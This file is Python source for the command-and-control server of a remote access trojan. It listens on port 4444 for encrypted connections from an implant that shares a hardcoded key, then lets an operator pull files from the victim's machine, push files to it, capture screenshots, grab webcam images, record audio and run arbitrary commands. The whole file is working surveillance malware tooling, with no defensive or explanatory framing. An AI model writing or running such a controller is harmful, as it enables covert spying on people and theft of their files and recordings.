import socket
import threading
from cryptography.fernet import Fernet
import io
from PIL import Image

# Shared encryption key (must match client)
key = "KIVNwL8Ed7yD84YtLV2FSy2aZ-fdTZgXXGFrMsXKGFg="
cipher = Fernet(key)

SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444

def send_encrypted(s, data):
    encrypted_data = cipher.encrypt(data)
    length = len(encrypted_data).to_bytes(4, 'big')
    s.sendall(length + encrypted_data)

def receive_encrypted(s):
    try:
        length_data = s.recv(4)
        if not length_data:
            return None
        length = int.from_bytes(length_data, 'big')
        data = b""
        while len(data) < length:
            chunk = s.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        return cipher.decrypt(data)
    except Exception as e:
        print(f"[!] Receive error: {e}")
        return None

def save_screenshot(screenshot_data):
    try:
        img = Image.open(io.BytesIO(screenshot_data))
        img.save("screenshot.png")
        print("[*] Screenshot saved as screenshot.png")
    except Exception as e:
        print(f"[!] Failed to save screenshot: {e}")

def save_file(filename, data):
    try:
        with open(filename, "wb") as f:
            f.write(data)
        print(f"[*] File saved as {filename}")
    except Exception as e:
        print(f"[!] Failed to save file: {e}")

def handle_client(s):
    try:
        print(f"[*] Client connected: {s.getpeername()}")
        while True:
            cmd = input("[*] Enter command: ").strip()
            if not cmd:
                continue

            # Exit
            if cmd == "exit":
                send_encrypted(s, b"exit")
                print("[*] Closing connection.")
                s.close()
                break

            # Upload a file
            elif cmd.startswith("upload_file"):
                try:
                    _, local_path, remote_path = cmd.split(" ", 2)
                    with open(local_path, "rb") as f:
                        file_data = f.read()
                    send_encrypted(s, f"upload_file {remote_path}".encode())
                    send_encrypted(s, file_data)
                    print("[*] File uploaded.")
                except Exception as e:
                    print(f"[!] Upload error: {e}")

            # Download a file
            elif cmd.startswith("download_file"):
                try:
                    _, remote_path = cmd.split(" ", 1)
                    send_encrypted(s, cmd.encode())
                    ack = receive_encrypted(s)
                    if b"success" in ack:
                        file_data = receive_encrypted(s)
                        filename = remote_path.split("/")[-1]
                        save_file(filename, file_data)
                    else:
                        print(ack.decode())
                except Exception as e:
                    print(f"[!] Download error: {e}")

            # Screenshot capture
            elif cmd == "screenshot":
                send_encrypted(s, b"screenshot")
                response = receive_encrypted(s)
                print(response.decode())
                screenshot_data = receive_encrypted(s)
                save_screenshot(screenshot_data)

            # Webcam
            elif cmd == "webcam":
                send_encrypted(s, b"webcam")
                response = receive_encrypted(s)
                print(response.decode())
                cam_data = receive_encrypted(s)
                save_file("webcam.png", cam_data)

            # Audio
            elif cmd == "record_audio":
                send_encrypted(s, b"record_audio")
                response = receive_encrypted(s)
                print(response.decode())
                audio_data = receive_encrypted(s)
                save_file("audio.wav", audio_data)

            # Other commands
            else:
                send_encrypted(s, cmd.encode())
                response = receive_encrypted(s)
                try:
                    print(response.decode())
                except:
                    save_file("output.bin", response)
                    print("[*] Binary data saved as output.bin")

    except Exception as e:
        print(f"[!] Error in client thread: {e}")
        s.close()

def start_server():
    server_socket = socket.socket()
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(5)
    print(f"[*] Server listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] Connection established with {addr}")
        threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()

if __name__ == "__main__":
    start_server()
